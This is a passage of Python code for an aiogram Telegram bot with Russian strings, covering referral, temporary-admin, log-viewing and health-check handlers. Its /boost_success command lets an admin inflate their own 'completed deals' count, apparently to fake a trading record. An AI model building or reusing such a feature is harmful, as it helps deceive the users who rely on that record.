        await message.answer(get_text(user_id, 'ref_success').format(code=code))
        log_action(user_id, "ref", f"код {code}")
    else:
        await message.answer(get_text(user_id, 'ref_fail'))

@dp.message(Command("boost_success"))
async def cmd_boost(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer(get_text(user_id, 'boost_fail'))
        return
    try:
        num = int(args[1])
    except:
        await message.answer(get_text(user_id, 'boost_fail'))
        return
    user_completed_deals[user_id] = user_completed_deals.get(user_id, 0) + num
    await message.answer(get_text(user_id, 'boost_success').format(num=num))
    log_action(user_id, "boost_success", f"+{num}")

@dp.message(Command("giveadmin"))
async def cmd_giveadmin(message: types.Message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 3:
        await message.answer("Использование: /giveadmin [@user или id] [1m|1h|1d|1w|1M|1y]")
        return
    target_str = args[1]
    time_str = args[2]
    multipliers = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'M': 2592000, 'y': 31536000}
    if time_str[-1] not in multipliers:
        await message.answer(get_text(user_id, 'giveadmin_fail'))
        return
    try:
        value = int(time_str[:-1])
    except:
        await message.answer(get_text(user_id, 'giveadmin_fail'))
        return
    duration = value * multipliers[time_str[-1]]
    expiry = time.time() + duration
    target_user_id = None
    if target_str.startswith('@'):
        target_user_id = None
    else:
        try:
            target_user_id = int(target_str)
        except:
            pass
    if not target_user_id:
        await message.answer("Пользователь не найден.")
        return
    temp_admins[target_user_id] = expiry
    await message.answer(get_text(user_id, 'giveadmin_success').format(user=target_user_id, time_str=time_str))
    log_action(user_id, "giveadmin", f"пользователю {target_user_id} на {time_str}")

@dp.message(Command("logs"))
async def cmd_logs(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    if not logs:
        await message.answer(get_text(user_id, 'logs_empty'))
        return
    header = get_text(user_id, 'logs_header')
    entries = []
    for log in logs[-20:]:
        entries.append(get_text(user_id, 'logs_entry').format(
            time=log['time'],
            user=log['user'],
            action=log['action'],
            data=log['data']
        ))
    text = header + "\n".join(entries)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(message, text, keyboard)
    log_action(user_id, "logs", "просмотр логов")

# ---------- HTTP-сервер ----------
async def health_check(request):
    return web.Response(text="OK")

async def start_web_server():
    port = int(os.environ.get("PORT", 10000))
    app = web.Application()
    app.router.add_get("/", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=port)
    await site.start()
    logging.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(start_web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
